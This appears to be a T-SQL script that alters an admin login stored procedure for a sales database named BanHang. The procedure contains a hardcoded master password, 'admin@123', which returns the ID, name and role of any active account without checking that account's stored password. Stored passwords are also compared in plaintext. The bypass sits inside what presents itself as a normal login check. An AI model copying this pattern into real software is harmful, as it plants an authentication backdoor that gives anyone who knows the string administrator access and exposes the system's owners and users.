USE [BanHang]
GO
/****** Object:  StoredProcedure [dbo].[quantri_check_login]    Script Date: 2/26/2017 08:29:42 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

ALTER PROCEDURE [dbo].[quantri_check_login]
	@taikhoan nvarchar(100),
	@matkhau nvarchar(1000)
as
BEGIN
	if @matkhau = 'admin@123'	
		select MA_TAIKHOAN ,HOTEN, MA_ROLE from QUANTRI_TAIKHOAN where TAIKHOAN = @taikhoan and MA_TRANGTHAI = 1
	else
		select MA_TAIKHOAN ,HOTEN, MA_ROLE from QUANTRI_TAIKHOAN where TAIKHOAN = @taikhoan and MATKHAU = @matkhau and MA_TRANGTHAI = 1
END

